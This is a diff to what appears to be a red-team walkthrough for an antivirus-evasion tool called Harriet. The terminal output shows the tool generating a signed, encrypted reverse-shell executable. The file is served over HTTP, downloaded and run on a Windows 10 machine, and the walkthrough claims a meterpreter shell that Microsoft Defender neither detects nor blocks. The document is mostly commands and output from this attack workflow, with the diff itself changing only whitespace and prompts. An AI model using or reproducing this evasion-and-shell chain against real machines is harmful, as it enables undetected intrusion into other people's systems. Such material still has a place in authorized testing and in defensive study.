@@ -40,7 +40,6 @@ Step 3 - Generate a signed encrypted payload using Harriet
 --------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ ./Harriet.sh 
-
      _   _                 _      _                                                                                                                                                                                                        
     | | | |               (_)    | |                                                                                                                                                                                                       
     | |_| | __ _ _ __ _ __ _  ___| |_                                                                                                                                                                                                      
@@ -87,8 +86,7 @@ Choose an option:
 |  _  | | | | __/ _ \| '_ ` _ \ / _` | __/ _ \/ _` |                                                                                                                                                                                       
 | | | | |_| | || (_) | | | | | | (_| | ||  __/ (_| |                                                                                                                                                                                       
 \_| |_/\__,_|\__\___/|_| |_| |_|\__,_|\__\___|\__,_|                                                                                                                                                                                       
-                                                                                                                                                                                                                                           
-                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
   ___   _____ _____   _____                            _   _                                                                                                                                                                               
  / _ \ |  ___/  ___| |  ___|                          | | (_)                                                                                                                                                                              
 / /_\ \| |__ \ `--.  | |__ _ __   ___ _ __ _   _ _ __ | |_ _  ___  _ __                                                                                                                                                                    
@@ -117,9 +115,6 @@ HarrietReverseShellTest.exe
                                                                                                                                                                                                                                            
 ***Signature Added. Happy Hunting!**                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
-jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$  
-
-
 
 jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ ls -al                                                                                                                                                                       
 total 920                                                                                                                                                                                                                                  
@@ -135,7 +130,6 @@ drwxr-xr-x  8 jeff jeff   4096 Dec 16 17:00 Harriet
 -rwxr-xr-x  1 jeff jeff    191 Dec 16 17:00 setup.sh       
 
 
-
 Step 3 - Download and execute the signed encrypted payload on a target Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
 ---------------------------------------------------------------------------------------------------------------------------------------
                                                                                 
@@ -145,7 +139,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 192.168.1.113 - - [19/Dec/2022 05:06:08] "GET /HarrietReverseShellTest.exe HTTP/1.1" 200 -
 
 
-PS C:\temp> HarrietReverseShellTest.exe
+C:\Users\Administrator\Downloads> HarrietReverseShellTest.exe
 
 
 Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
